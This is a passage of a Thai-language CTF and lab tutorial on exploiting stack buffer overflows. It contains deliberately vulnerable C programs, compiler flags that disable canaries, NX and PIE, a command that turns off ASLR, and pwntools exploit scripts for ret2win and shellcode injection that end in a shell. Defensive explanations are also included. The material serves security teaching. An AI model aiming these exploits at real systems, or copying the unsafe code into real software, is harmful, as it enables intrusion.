# Compile vulnerable program (สำหรับ CTF/lab เท่านั้น!)
gcc -o vulnerable vulnerable.c \
    -fno-stack-protector \     # Disable stack canary
    -z execstack \             # Allow execution on stack
    -no-pie \                  # Disable PIE (Position Independent Executable)
    -g                         # Include debug symbols

# สำหรับ 32-bit binary บน 64-bit system
gcc -o vulnerable32 vulnerable.c \
    -m32 \                     # Compile as 32-bit
    -fno-stack-protector \
    -z execstack \
    -no-pie
```

### 10.2 ความหมายของแต่ละ Flag

**`-fno-stack-protector`:**
- ปิด Stack Canary
- ปกติ GCC จะใส่ random value ระหว่าง local vars กับ return address
- ถ้า canary ถูก overwrite → program terminate ก่อน return
- Flag นี้ disable feature นี้

**`-z execstack`:**
- ทำให้ stack สามารถ execute code ได้
- ปกติ kernel ป้องกันไม่ให้ execute code บน stack (NX bit)
- Flag นี้ mark stack segment เป็น executable
- ต้องการสำหรับ shellcode injection บน stack

**`-no-pie`:**
- Disable Position Independent Executable
- ทำให้ binary load ที่ fixed address เสมอ (เช่น 0x400000)
- ปกติ PIE + ASLR จะทำให้ทุก memory address random
- Flag นี้ทำให้ addresses ของ functions/data fixed และ predictable

**`-g`:**
- Include debug symbols
- ทำให้ GDB แสดง source code, variable names, function names
- ไม่ส่งผลต่อ security

### 10.3 ตัวอย่างการ Compile หลายแบบ

```bash
# สำหรับ demo stack overflow พื้นฐาน
gcc -o basic_overflow basic_overflow.c \
    -fno-stack-protector \
    -no-pie \
    -g

# สำหรับ shellcode injection
gcc -o shellcode_demo shellcode_demo.c \
    -fno-stack-protector \
    -z execstack \
    -no-pie \
    -g

# Fully hardened (เป็นค่า default บน modern systems)
gcc -o hardened program.c
# → PIE, Stack Canary, NX ทั้งหมดเปิดอยู่

# ตรวจสอบ security features
checksec --file=./basic_overflow
checksec --file=./shellcode_demo
checksec --file=./hardened
```

### 10.4 Makefile สำหรับ Practice

```makefile
# Makefile
CC = gcc
CFLAGS = -g

all: vuln_basic vuln_shellcode hardened

# Basic overflow - no canary, no PIE, but NX on
vuln_basic: vuln.c
	$(CC) $(CFLAGS) -fno-stack-protector -no-pie -o $@ $<

# For shellcode injection - no canary, no PIE, no NX
vuln_shellcode: vuln.c
	$(CC) $(CFLAGS) -fno-stack-protector -no-pie -z execstack -o $@ $<

# 32-bit version
vuln_32: vuln.c
	$(CC) $(CFLAGS) -m32 -fno-stack-protector -no-pie -z execstack -o $@ $<

# Hardened version (default protections)
hardened: vuln.c
	$(CC) $(CFLAGS) -o $@ $<

clean:
	rm -f vuln_basic vuln_shellcode vuln_32 hardened
```

---

## 11. GDB Analysis: Examine Stack Frame

### 11.1 Setup GDB สำหรับ Analysis

```bash
# เริ่ม GDB
gdb -q ./vulnerable

# ใน ~/.gdbinit หรือ /.pwndbg (ถ้าใช้ pwndbg)
set disassembly-flavor intel    # Intel syntax (ไม่ใช่ AT&T)
set pagination off              # ไม่ต้อง press enter ทุกหน้า
```

### 11.2 Examine Function Prologue

```bash
# Disassemble function
pwndbg> disas vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x00401196 <+0>:     endbr64
   0x0040119a <+4>:     push   rbp           ← save caller's rbp
   0x0040119b <+5>:     mov    rbp,rsp       ← rbp = rsp (new frame)
   0x0040119e <+8>:     sub    rsp,0x50      ← allocate 0x50 = 80 bytes
   0x004011a2 <+12>:    lea    rax,[rbp-0x50]← address of buffer
   0x004011a6 <+16>:    mov    rdi,rax       ← first arg = buffer
   0x004011a9 <+19>:    call   0x401080 <gets@plt>  ← call gets()
   0x004011ae <+24>:    nop
   0x004011af <+25>:    leave               ← restore rbp
   0x004011b0 <+26>:    ret                 ← return
```

จาก disassembly เราเห็นว่า:
- Buffer อยู่ที่ `rbp - 0x50` = rbp - 80
- Offset = 80 (buffer) + 8 (saved rbp) = **88 bytes**

### 11.3 Set Breakpoint และ Examine Stack

```bash
pwndbg> break *vulnerable_function+19    # ก่อน gets()
pwndbg> run

# หยุดที่ breakpoint
pwndbg> x/30gx $rsp    # ดู stack 30 qwords

pwndbg> info frame
Stack level 0, frame at 0x7fffffffef10:
 rip = 0x4011a9 in vulnerable_function; saved rip = 0x4011e3
 called by frame at 0x7fffffffef20
 Arglist at 0x7fffffffef08, args: 
 Locals at 0x7fffffffef08, frame base 0x7fffffffef08

# ดู rbp และ +-
pwndbg> p $rbp
$1 = (void *) 0x7fffffffef08

pwndbg> x/gx $rbp        # Saved RBP value
0x7fffffffef08: 0x00007fffffffef20

pwndbg> x/gx $rbp+8      # Return Address
0x7fffffffef10: 0x00000000004011e3   ← return to main+xx
```

### 11.4 Examine Stack Before และ After gets()

```bash
# Before gets() - stack mostly zeros
pwndbg> x/20gx $rbp-0x50
0x7fffffffee58: 0x0000000000000000  0x0000000000000000
0x7fffffffee68: 0x0000000000000000  0x0000000000000000
0x7fffffffee78: 0x0000000000000000  0x0000000000000000
0x7fffffffee88: 0x0000000000000000  0x0000000000000000
0x7fffffffee98: 0x0000000000000000  0x0000000000000000
0x7fffffffeea8: 0x0000000000000000  0x00007fffffffef20  ← saved rbp
0x7fffffffeeb8: [return address]                         ← (at $rbp+8)
```

```bash
# ส่ง input "AAAABBBBCCCCDDDD..."
pwndbg> continue
# type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB
# (80 A's + 8 B's = 88 bytes)

# After gets() - หลัง step over
pwndbg> x/20gx $rbp-0x50
0x7fffffffee58: 0x4141414141414141  0x4141414141414141  ← AAAAAAAA
0x7fffffffee68: 0x4141414141414141  0x4141414141414141
0x7fffffffee78: 0x4141414141414141  0x4141414141414141
0x7fffffffee88: 0x4141414141414141  0x4141414141414141
0x7fffffffee98: 0x4141414141414141  0x4141414141414141  ← end of buffer
0x7fffffffeea8: 0x4242424242424242  ← SAVED RBP OVERWRITTEN! (BBBBBBBB)
0x7fffffffeeb8: ...                  ← if more bytes, return addr too
```

### 11.5 telescope Command (pwndbg)

```bash
pwndbg> telescope $rsp 20
00:0000│ rsp 0x7fffffffee58 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...'
01:0008│     0x7fffffffee60 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
02:0010│     0x7fffffffee68 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
03:0018│     0x7fffffffee70 ◂— 'AAAAAAAAAAAAAAAAAAAAAA'
04:0020│     0x7fffffffee78 ◂— 'AAAAAAAAAAAAAA'
05:0028│     0x7fffffffee80 ◂— 'AAAAAA'
06:0030│     0x7fffffffee88 ◂— 'AAAA'
07:0038│     0x7fffffffee90 ◂— 'AA'
08:0040│     0x7fffffffee98 ◂— 0x0
09:0048│ rbp 0x7fffffffeea0 ◂— 'BBBBBBBB'    ← saved rbp overwritten!
0a:0050│     0x7fffffffeea8 —▸ [return addr or overwritten]
```

---

## 12. checksec Tool Output Interpretation

### 12.1 ติดตั้ง checksec

```bash
# Method 1: ผ่าน package manager
sudo apt-get install checksec

# Method 2: ผ่าน pip
pip3 install checksec.py

# Method 3: download script
wget -O checksec https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec
chmod +x checksec
```

### 12.2 ตัวอย่าง Output และความหมาย

```bash
$ checksec --file=./vulnerable
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   85 Symbols      No       0          3            ./vulnerable
```

### 12.3 ความหมายของแต่ละ Field

**RELRO (Relocation Read-Only):**
```
No RELRO      → PLT/GOT sections writable (ง่ายที่สุดสำหรับ GOT overwrite attack)
Partial RELRO → GOT partially protected, .got.plt writable (common default)
Full RELRO    → Entire GOT read-only (ป้องกัน GOT overwrite attacks)
```

**STACK CANARY:**
```
No canary found   → ไม่มี stack canary → Buffer overflow ง่าย
Canary found      → มี stack canary → ต้อง bypass ก่อน
```

**NX (No-Execute):**
```
NX disabled   → Stack executable → Shellcode injection บน stack ทำได้
NX enabled    → Stack ไม่ executable → ต้องใช้ ROP chains
```

**PIE (Position Independent Executable):**
```
No PIE        → Binary load ที่ fixed address → Function addresses predictable
PIE enabled   → Binary load ที่ random address (ร่วมกับ ASLR)
```

**RPATH/RUNPATH:**
```
ถ้ามีค่า → อาจมีช่องโหว่ library hijacking
```

**FORTIFY:**
```
Fortified > 0 → มีการใช้ _FORTIFY_SOURCE → dangerous functions ถูก replaced
                ด้วย safe versions ที่มี bounds checking
```

### 12.4 Difficulty Matrix

| RELRO  | Canary | NX       | PIE | Difficulty  | Attack Vector           |
|--------|--------|----------|-----|-------------|-------------------------|
| None   | No     | Disabled | No  | Very Easy   | Direct shellcode        |
| Partial| No     | Disabled | No  | Easy        | Shellcode on stack      |
| Partial| No     | Enabled  | No  | Medium      | ROP chain, ret2libc     |
| Full   | Yes    | Enabled  | Yes | Hard        | Leak + ROP + bypass     |

### 12.5 pwndbg checksec

```bash
pwndbg> checksec
[*] '/home/user/vulnerable'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

---

## 13. pwntools: Basic Exploit Script Template

### 13.1 ติดตั้ง pwntools

```bash
# ติดตั้ง
pip3 install pwntools

# หรือ
sudo apt-get install python3-pwntools
```

### 13.2 Template พื้นฐาน

```python
#!/usr/bin/env python3
"""
Template สำหรับ Buffer Overflow Exploit
แก้ไข parameters ตามแต่ละ challenge
"""

from pwn import *

# ============================================================
# Configuration
# ============================================================
binary_path = './vulnerable'
elf = ELF(binary_path)           # Load ELF binary

context.binary = elf              # Set context from binary (arch, OS, etc.)
context.log_level = 'info'        # 'debug' for verbose, 'info' for normal

# ============================================================
# Connect to target
# ============================================================
def get_io():
    """Returns a connection to the target"""
    if args.REMOTE:
        # CTF remote connection
        return remote('challenge.ctf.com', 1337)
    elif args.GDB:
        # Attach GDB
        return gdb.debug(binary_path, gdbscript='''
            break *vulnerable_function+19
            continue
        ''')
    else:
        # Local process
        return process(binary_path)

# ============================================================
# Exploit
# ============================================================
def exploit():
    io = get_io()

    # ----- Step 1: Receive initial output if any -----
    io.recvuntil(b'Enter input: ')    # Wait for prompt

    # ----- Step 2: Build payload -----
    offset = 72               # Offset to RIP (found via cyclic pattern)
    
    # Option A: ret2win (jump to win function)
    win_addr = elf.symbols['win']    # Get address from symbol table
    log.info(f"win() address: {hex(win_addr)}")
    
    payload = flat(
        b'A' * offset,        # Padding to reach RIP
        p64(win_addr)         # Overwrite RIP with win() address
    )

    # ----- Step 3: Send payload -----
    log.info(f"Sending payload ({len(payload)} bytes)")
    io.sendline(payload)

    # ----- Step 4: Interact with shell / get output -----
    io.interactive()

# ============================================================
# Main
# ============================================================
if __name__ == '__main__':
    exploit()
```

### 13.3 Common pwntools Operations

```python
from pwn import *

# ---- Process/Connection ----
p = process('./binary')                    # Local
p = remote('host', port)                  # Remote TCP
p = remote('host', port, ssl=True)        # Remote TLS
p = remote('/path/to/socket', typ='unix') # Unix socket

# ---- Sending Data ----
p.send(b'data')           # Send without newline
p.sendline(b'data')       # Send with \n
p.sendafter(b'prompt', b'data')    # Send after receiving prompt
p.sendlineafter(b'prompt', b'data')

# ---- Receiving Data ----
p.recv(n)                 # Receive exactly n bytes
p.recvn(n)                # Same as recv(n)
p.recvline()              # Receive until newline
p.recvuntil(b'str')       # Receive until string found
p.recvall()               # Receive until EOF
p.clean()                 # Receive all available data

# ---- Packing/Unpacking ----
p32(0x41424344)           # → b'\x44\x43\x42\x41' (little-endian)
p64(0x4141414141414141)   # → 8 bytes little-endian
u32(b'\x44\x43\x42\x41') # → 0x41424344
u64(b'\x41...\x41')      # → 64-bit value

# ---- flat() for complex payloads ----
payload = flat(
    b'A' * 64,
    b'B' * 8,
    p64(0xdeadbeef),
    cyclic(20),
)

# ---- ELF parsing ----
elf = ELF('./binary')
elf.symbols['function_name']    # Symbol address
elf.plt['puts']                 # PLT entry address
elf.got['puts']                 # GOT entry address
elf.address                     # Base address (useful for PIE)

# ---- Shellcode ----
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())         # x86-64 /bin/sh
shellcode = asm(shellcraft.i386.sh())    # x86 /bin/sh

# ---- Cyclic ----
cyclic(200)               # Generate 200-byte pattern
cyclic_find(0x6161616e)   # Find offset from crash value

# ---- Logging ----
log.info("Information")
log.success("Success!")
log.warning("Warning")
log.error("Error")
log.debug("Debug info")

# ---- Interactive ----
p.interactive()           # Switch to interactive shell
```

### 13.4 Template สำหรับ Shellcode Injection

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln_shellcode'
elf = ELF(binary)
context.binary = elf

def exploit():
    io = process(binary)

    # Disable ASLR detection (ต้องปิด ASLR ใน system ก่อน)
    # echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

    # Parameters
    buf_offset = 136     # Offset to return address
    buf_addr = 0x7fffffffee80    # Stack address of buffer (from GDB)

    # Shellcode
    shellcode = asm(shellcraft.sh())
    log.info(f"Shellcode: {len(shellcode)} bytes")
    log.info(f"Shellcode hex: {shellcode.hex()}")

    # NOP sled
    nop_size = 50
    nop_sled = b'\x90' * nop_size

    # Ensure we have enough space
    assert len(nop_sled) + len(shellcode) <= buf_offset, "Shellcode too large!"

    # Build payload
    payload = flat(
        nop_sled,                                         # NOP sled
        shellcode,                                         # Shellcode
        b'A' * (buf_offset - nop_size - len(shellcode)),  # Padding
        p64(buf_addr + nop_size // 2)                     # Return to middle of NOP sled
    )

    log.info(f"Payload: {len(payload)} bytes")
    log.info(f"Return addr: {hex(buf_addr + nop_size // 2)}")

    io.sendline(payload)
    io.interactive()

exploit()
```

---

## 14. Proof of Concept: Crash to Controlled RIP

### 14.1 ขั้นที่ 1: Verify Crash

```bash
# ส่ง pattern ยาวๆ เพื่อทำให้ crash
$ python3 -c "print('A'*300)" | ./vulnerable
Segmentation fault (core dumped)
```

### 14.2 ขั้นที่ 2: ยืนยัน Offset

```python
#!/usr/bin/env python3
# step2_find_offset.py
from pwn import *

binary = './vulnerable'
p = process(binary)

# ส่ง cyclic pattern
pattern = cyclic(200)
p.sendline(pattern)

# Wait for crash
p.wait()
core = p.corefile

# หา offset จาก core dump
rip = core.rip
log.info(f"RIP value at crash: {hex(rip)}")
offset = cyclic_find(rip)
log.info(f"Offset: {offset}")
```

```bash
$ python3 step2_find_offset.py
[*] RIP value at crash: 0x6161616e6161616d
[*] Offset: 72
```

### 14.3 ขั้นที่ 3: Controlled Crash (สั่ง RIP ให้เป็นค่าที่เราต้องการ)

```python
#!/usr/bin/env python3
# step3_controlled_rip.py
from pwn import *

binary = './vulnerable'
p = process(binary)

offset = 72

# ใส่ค่า distinctive เพื่อยืนยันว่าเราควบคุม RIP ได้
controlled_value = 0xdeadbeefcafebabe

payload = flat(
    b'A' * offset,
    p64(controlled_value)
)

p.sendline(payload)
p.wait()

core = p.corefile
log.info(f"RIP: {hex(core.rip)}")
assert core.rip == controlled_value, "RIP not controlled!"
log.success(f"RIP controlled! RIP = {hex(core.rip)}")
```

```bash
$ python3 step3_controlled_rip.py
[*] RIP: 0xdeadbeefcafebabe
[+] RIP controlled! RIP = 0xdeadbeefcafebabe
```

### 14.4 ขั้นที่ 4: Redirect to Win Function

```c
// vulnerable.c - มี win() function ซ่อนอยู่
#include <stdio.h>
#include <string.h>

void win() {
    printf("[!] You win! Flag: CTF{buffer_overflow_is_fun}\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

```python
#!/usr/bin/env python3
# step4_redirect_win.py
from pwn import *

binary = './vulnerable'
elf = ELF(binary)

p = process(binary)

# Get win() address
win_addr = elf.symbols['win']
log.info(f"win() at: {hex(win_addr)}")

offset = 72

payload = flat(
    b'A' * offset,
    p64(win_addr)
)

p.recvuntil(b'Enter your name: ')
p.sendline(payload)

# Win!
output = p.recvall(timeout=2)
log.success(f"Output: {output.decode()}")
```

```bash
$ python3 step4_redirect_win.py
[*] win() at: 0x401196
[+] Output: [!] You win! Flag: CTF{buffer_overflow_is_fun}
```

---

## 15. Defense Mechanisms

### 15.1 Stack Canaries

**คืออะไร:**
Stack Canary คือ random value ที่วางไว้ระหว่าง local variables และ saved RBP บน stack

**วิธีทำงาน:**
```
Stack Layout กับ Canary:
┌────────────────────────┐
│    Return Address      │ ← target ของ attacker
├────────────────────────┤
│    Saved RBP           │
├────────────────────────┤
│    STACK CANARY        │ ← random value, checked before return
├────────────────────────┤
│    Local Variables     │
│    char buffer[64]     │ ← overflow starts here
└────────────────────────┘
```

**การตรวจสอบ:**
```c
// Compiler-generated pseudocode
void vulnerable() {
    char buffer[64];
    long canary = __stack_chk_guard;    // ← ค่า random จาก TLS
    
    gets(buffer);    // potential overflow
    
    if (canary != __stack_chk_guard) {  // ← check ก่อน return
        __stack_chk_fail();             // → terminate program
    }
    return;
}
```

**Compile กับ/ไม่มี Canary:**
```bash
gcc -fstack-protector program.c       # Enable (ใส่เฉพาะ functions ที่มี buffers)
gcc -fstack-protector-all program.c   # Enable ทุก functions
gcc -fno-stack-protector program.c    # Disable
```

**Bypass Canary (สำหรับ CTF):**
1. **Brute force (32-bit):** Canary = 4 bytes, ลอง ~256 ครั้ง
2. **Info leak:** หา canary value ก่อนแล้วใส่ใน payload
3. **Format string bug:** อ่าน canary value จาก stack

### 15.2 NX / DEP (Non-Executable Stack)

**NX (No-Execute)** หรือ **DEP (Data Execution Prevention)** ป้องกันการ execute code บน stack/data segments

**วิธีทำงาน:**
- CPU มี NX bit สำหรับแต่ละ memory page
- ถ้า NX bit set และ CPU พยายาม execute → fault

**ตรวจสอบ:**
```bash
# ดู NX ใน binary
checksec --file=./binary
# NX: NX enabled  ← stack ไม่ executable

# ดู memory segments
cat /proc/PID/maps
# 7fff...    rwxp  ← เดิม (NX disabled)
# 7fff...    rw-p  ← ปัจจุบัน (NX enabled, ไม่มี x)
```

**Bypass NX:**
- **Return-to-libc:** Jump ไป libc functions แทน shellcode
- **ROP (Return-Oriented Programming):** Chain gadgets จาก executable sections

### 15.3 ASLR (Address Space Layout Randomization)

**วิธีทำงาน:**
- Kernel randomize base addresses ของ stack, heap, libraries ทุก execution
- ทำให้ไม่รู้ address ของ shellcode หรือ libc functions

**ระดับ ASLR:**
```bash
# ดู ASLR level
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = stack, heap, mmap randomized (ไม่รวม stack ใน some distros)
# 2 = full randomization (default บน modern Linux)
```

**การทดสอบ ASLR:**
```bash
# Run หลายครั้ง ดู stack address
for i in $(seq 5); do
    cat /proc/$(pgrep program)/maps | grep stack
done
# ถ้า ASLR เปิด: แต่ละ run address ต่างกัน
```

**Bypass ASLR:**
1. **Info leak:** ใช้ format string bug หรือ controlled read เพื่อ leak address
2. **Brute force (32-bit):** Space randomization เล็ก (~12 bits)
3. **Ret2plt:** Use PLT entries ที่ fixed address (เมื่อ PIE ปิด)

### 15.4 PIE (Position Independent Executable)

**วิธีทำงาน:**
- Binary เองก็ถูก load ที่ random address (ร่วมกับ ASLR)
- ทำให้ function addresses ใน binary ไม่ fixed

**Compile:**
```bash
gcc -pie -fPIC program.c    # Enable PIE
gcc -no-pie program.c       # Disable PIE
```

**Bypass PIE:**
- ต้อง leak binary base address ก่อน
- จากนั้น calculate offset: `real_addr = base + offset_in_binary`

### 15.5 Stack Canary Implementation ใน GCC

```c
// ตัวอย่าง output จาก gcc -S (assembly)
// สังเกต canary mechanism

vulnerable_function:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x60
    
    ; === CANARY SETUP ===
    mov     rax, QWORD PTR fs:0x28    ; อ่าน canary จาก TLS (Thread Local Storage)
    mov     QWORD PTR [rbp-0x8], rax  ; เก็บ canary บน stack
    xor     eax, eax
    ; ====================
    
    lea     rax, [rbp-0x50]
    mov     rdi, rax
    call    gets
    
    ; === CANARY CHECK ===
    mov     rcx, QWORD PTR [rbp-0x8]  ; อ่าน canary จาก stack
    xor     rcx, QWORD PTR fs:0x28    ; เปรียบเทียบกับ original
    je      .no_overflow               ; ถ้าเท่ากัน → ok
    call    __stack_chk_fail           ; ถ้าต่าง → terminate!
    ; ====================
.no_overflow:
    leave
    ret
```

### 15.6 สรุป Defense Layers

```
Attack Scenario และ Defense ที่ต้อง Bypass:

[1] Basic Stack Overflow
    Buffer → Overflow → Control RIP
    Defense: Stack Canary → ต้อง bypass canary

[2] Shellcode Injection
    Buffer → Shellcode → Execute
    Defense: NX → ต้องใช้ ROP แทน

[3] Return-to-libc / ROP
    Known libc addresses needed
    Defense: ASLR → ต้อง leak libc address ก่อน

[4] Info Leak + ROP
    Leak address → Calculate → Exploit
    Defense: Full RELRO + PIE + Canary → ยากมาก

[5] Format String → Canary Leak → ROP
    Format string → leak canary/libc → ROP chain
    Defense: ต้องมีช่องโหว่หลายอัน → ปิดทุกอัน
```

---

## 16. Complete Example: Vulnerable Program to Working Exploit

### 16.1 โปรแกรมที่ Vulnerable (Complete)

```c
// complete_example.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Hidden function - ไม่ถูกเรียกโดยตรง
void give_shell() {
    printf("[+] You got shell!\n");
    execve("/bin/sh", NULL, NULL);
}

// Vulnerable function
void greet_user() {
    char name[64];
    printf("What's your name? ");
    fflush(stdout);
    
    // Vulnerability: reads up to 256 bytes into 64-byte buffer
    read(STDIN_FILENO, name, 256);
    
    printf("Hello, %s!\n", name);
}

int main() {
    printf("=== Greeting Service ===\n");
    greet_user();
    printf("Goodbye!\n");
    return 0;
}
```

### 16.2 Compile

```bash
gcc -o complete_example complete_example.c \
    -fno-stack-protector \
    -no-pie \
    -g

# ตรวจสอบ
checksec --file=./complete_example
# RELRO: Partial RELRO
# STACK CANARY: No canary found
# NX: NX enabled          ← NX is ON แต่เราจะใช้ ret2win ไม่ใช่ shellcode
# PIE: No PIE (0x400000)
```

### 16.3 Analysis ด้วย GDB

```bash
$ gdb -q ./complete_example

# ดู functions
pwndbg> info functions
All defined functions:
Non-debugging symbols:
0x0000000000401196  give_shell
0x00000000004011c8  greet_user
0x00000000004011fc  main

# Disassemble greet_user
pwndbg> disas greet_user
Dump of assembler code for function greet_user:
   0x00000000004011c8 <+0>:     endbr64
   0x00000000004011cc <+4>:     push   rbp
   0x00000000004011cd <+5>:     mov    rbp,rsp
   0x00000000004011d0 <+8>:     sub    rsp,0x40           ← buffer = 0x40 = 64 bytes
   0x00000000004011d4 <+12>:    lea    rdi,[rip+0xe29]    
   0x00000000004011db <+19>:    call   0x401060 <puts@plt>
   0x00000000004011e0 <+24>:    mov    eax,0x0
   0x00000000004011e5 <+29>:    call   0x401070 <fflush@plt>
   0x00000000004011ea <+34>:    lea    rax,[rbp-0x40]     ← buffer at rbp-0x40
   0x00000000004011ee <+38>:    mov    edx,0x100          ← reads 256 bytes!
   0x00000000004011f3 <+43>:    mov    rsi,rax
   0x00000000004011f6 <+46>:    mov    edi,0x0
   0x00000000004011f9 <+49>:    call   0x401080 <read@plt>
   ...
   
# จาก disassembly: buffer อยู่ที่ rbp-0x40
# offset = 0x40 (64) + 8 (saved rbp) = 72
```

### 16.4 Verify Offset ด้วย Cyclic Pattern

```bash
pwndbg> run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
=== Greeting Service ===
What's your name? 
Program received signal SIGSEGV, Segmentation fault.
─── REGISTERS ───
 RIP  0x6161616e6161616d

pwndbg> cyclic -l 0x6161616e6161616d
Finding cyclic pattern of 8 bytes: b'maaanaaa' (hex: 0x6d61616e61616161)
Found at offset 72
```

**Offset confirmed: 72 bytes**

### 16.5 Final Exploit Script

```python
#!/usr/bin/env python3
# exploit_complete.py

from pwn import *

# ============================================================
# Setup
# ============================================================
binary_path = './complete_example'
elf = ELF(binary_path)
context.binary = elf
context.log_level = 'info'

# ============================================================
# Exploit
# ============================================================
def exploit():
    # Connection
    if args.REMOTE:
        io = remote('target.ctf.com', 9001)
    else:
        io = process(binary_path)

    log.info(f"PID: {io.pid}")

    # Get target address
    give_shell_addr = elf.symbols['give_shell']
    log.info(f"give_shell() @ {hex(give_shell_addr)}")

    # Build payload
    offset = 72

    payload = flat(
        b'A' * offset,           # Padding
        p64(give_shell_addr)     # Overwrite return address
    )

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(hexdump(payload))

    # Send
    io.recvuntil(b"What's your name? ")
    io.sendline(payload)

    # Get output
    log.success("Exploit sent! Getting shell...")
    io.interactive()

# ============================================================
# Run
# ============================================================
if __name__ == '__main__':
    exploit()
```

### 16.6 Result

```bash
$ python3 exploit_complete.py
[*] '/home/user/complete_example'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './complete_example': pid 5678
[*] PID: 5678
[*] give_shell() @ 0x401196
[*] Payload (80 bytes):
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000040  41 41 41 41  41 41 41 41  96 11 40 00  00 00 00 00  │AAAA│AAAA│..@.│....│
    00000050
[+] Exploit sent! Getting shell...
=== Greeting Service ===
[+] You got shell!
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ whoami
user
```

**Exploit สำเร็จ!**

---

## 17. CTF Challenge Walkthrough

### 17.1 CTF Challenge: "EasyPwn" (Example)

**Challenge Description:**
```
EasyPwn - 100 points
nc pwn.ctf.example.com 4444

Flag: CTF{???}
Hint: Simple stack overflow. Try to call the secret function.
```

**Files provided:**
- `easypwn` (binary)
- `easypwn.c` (source code, optional)

### 17.2 Step 1: Initial Recon

```bash
# ดู file type
$ file easypwn
easypwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
         interpreter /lib64/ld-linux-x86-64.so.2, not stripped

# ดู security
$ checksec easypwn
[*] '/home/user/ctf/easypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found    ← ดี
    NX:       NX enabled         ← ต้องใช้ ret2win ไม่ใช่ shellcode
    PIE:      No PIE (0x400000)  ← fixed addresses

# Run ดู behavior
$ ./easypwn
Welcome to EasyPwn!
Enter your name: hello
Hello, hello!
```

### 17.3 Step 2: Static Analysis

```bash
# ดู strings
$ strings easypwn
...
/bin/sh
flag.txt
cat flag.txt
Welcome to EasyPwn!
Enter your name: 
Hello, %s!
Congrats! Here's your flag:
...

# ดู functions ด้วย nm
$ nm easypwn | grep -v ' U '
0000000000401000 T _init
0000000000401196 T get_flag       ← interesting!
00000000004011d0 T vulnerable
0000000000401200 T main
```

```bash
# Disassemble ใน GDB
$ gdb -q ./easypwn
pwndbg> info functions
0x0000000000401196  get_flag
0x00000000004011d0  vulnerable
0x0000000000401200  main

pwndbg> disas get_flag
Dump of assembler code for function get_flag:
   0x0000000000401196 <+0>:     push   rbp
   0x0000000000401197 <+1>:     mov    rbp,rsp
   0x000000000040119a <+4>:     lea    rdi,[rip+0xe63]   # "Congrats! Here's your flag:"
   0x00000000004011a1 <+11>:    call   0x401060 <puts@plt>
   0x00000000004011a6 <+16>:    lea    rdi,[rip+0xe5b]   # "cat flag.txt"
   0x00000000004011ad <+23>:    call   0x401070 <system@plt>
   0x00000000004011b2 <+28>:    pop    rbp
   0x00000000004011b3 <+29>:    ret

pwndbg> disas vulnerable
Dump of assembler code for function vulnerable:
   0x00000000004011d0 <+0>:     push   rbp
   0x00000000004011d1 <+1>:     mov    rbp,rsp
   0x00000000004011d4 <+4>:     sub    rsp,0x60           ← buffer = 0x60 = 96 bytes
   0x00000000004011d8 <+8>:     ...    "Enter your name: "
   0x00000000004011e0 <+16>:    call   puts@plt
   0x00000000004011e5 <+21>:    lea    rax,[rbp-0x60]     ← buffer at rbp-0x60
   0x00000000004011e9 <+25>:    mov    rdi,rax
   0x00000000004011ec <+28>:    call   gets@plt            ← vulnerable!
   ...
```

### 17.4 Step 3: Find Offset

```bash
pwndbg> run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
Welcome to EasyPwn!
Enter your name: 
Program received signal SIGSEGV

pwndbg> cyclic -l $rip
Found at offset 104    # = 96 (buffer) + 8 (saved rbp)
```

### 17.5 Step 4: Write Exploit

```python
#!/usr/bin/env python3
# solve_easypwn.py

from pwn import *

binary = './easypwn'
elf = ELF(binary)

def solve():
    # Local test
    if args.REMOTE:
        io = remote('pwn.ctf.example.com', 4444)
    else:
        io = process(binary)

    # Target: get_flag()
    get_flag_addr = elf.symbols['get_flag']
    log.info(f"get_flag @ {hex(get_flag_addr)}")

    offset = 104    # From cyclic analysis

    payload = flat(
        b'A' * offset,
        p64(get_flag_addr)
    )

    io.recvuntil(b'Enter your name: ')
    io.sendline(payload)

    # Read flag
    io.recvuntil(b"Congrats!")
    flag_line = io.recvline()
    log.success(f"Flag: {flag_line.decode().strip()}")

    # Or interactive
    # io.interactive()

solve()
```

```bash
$ python3 solve_easypwn.py
[*] '/home/user/ctf/easypwn'
    ...
[*] get_flag @ 0x401196
[+] Flag: CTF{r3turn_0ri3nt3d_pwn1ng_b3g1ns}
```

